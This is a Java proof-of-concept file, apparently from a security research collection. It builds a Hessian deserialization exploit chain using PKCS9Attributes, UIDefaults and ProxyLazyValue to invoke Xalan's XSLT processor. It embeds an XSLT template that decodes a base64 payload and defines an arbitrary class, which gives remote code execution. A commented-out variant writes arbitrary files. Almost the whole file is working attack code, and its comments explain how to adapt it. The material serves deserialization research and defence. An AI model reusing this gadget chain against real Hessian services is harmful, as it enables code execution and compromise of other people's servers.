package com.javasec.pocs.hessian;

import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xalan.internal.xslt.Process;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;

import javax.swing.*;

/**
 *存在任意文件写场景/任意命令执行、更稳定高版本的RCE、Hessian环境下
 * Use HessianFileWrite First
 * 未知原因无法调试
 */

public class HessianXsltRCE {
    final static String xsltTemplate = "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n" +
            "xmlns:b64=\"http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\"\n" +
            "xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"\n" +
            "xmlns:th=\"http://xml.apache.org/xalan/java/java.lang.Thread\"\n" +
            "xmlns:ru=\"http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\"\n" +
            ">\n" +
            "    <xsl:template match=\"/\">\n" +
            "      <xsl:variable name=\"bs\" select=\"b64:decodeBuffer(b64:new(),'<base64_payload>')\"/>\n" +
            "      <xsl:variable name=\"cl\" select=\"th:getContextClassLoader(th:currentThread())\"/>\n" +
            "      <xsl:variable name=\"rce\" select=\"ru:defineClass('<class_name>',$bs,$cl)\"/>\n" +
            "      <xsl:value-of select=\"$rce\"/>\n" +
            "    </xsl:template>\n" +
            "  </xsl:stylesheet>";
    public static void main(String[] args) throws Exception {
        //Pkcs9可以换成MimeTypeParameterList
        PKCS9Attributes pkcs9Attributes = SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        //PKCS9Attribute.EMAIL_ADDRESS_OID 是固定的，调试流程可以看到逻辑
        //去修改需要读取的文件，和写入的文件名，实例中是读取1.txt写入pwned.txt
        //uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new UIDefaults.ProxyLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{"E:\\pwned.txt",SerializeUtils.getFileBytes("E:\\1.txt")}));
        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new UIDefaults.ProxyLazyValue("com.sun.org.apache.xalan.internal.xslt.Process", "_main", new Object[]{new String[]{"-XT", "-XSL", "E:\\payload.xslt"}}));
        SerializeUtils.setFieldValue(pkcs9Attributes,"attributes",uiDefaults);
        SerializeUtils.HessianDeserial(SerializeUtils.HessianTostringSerial(pkcs9Attributes));
    }
}
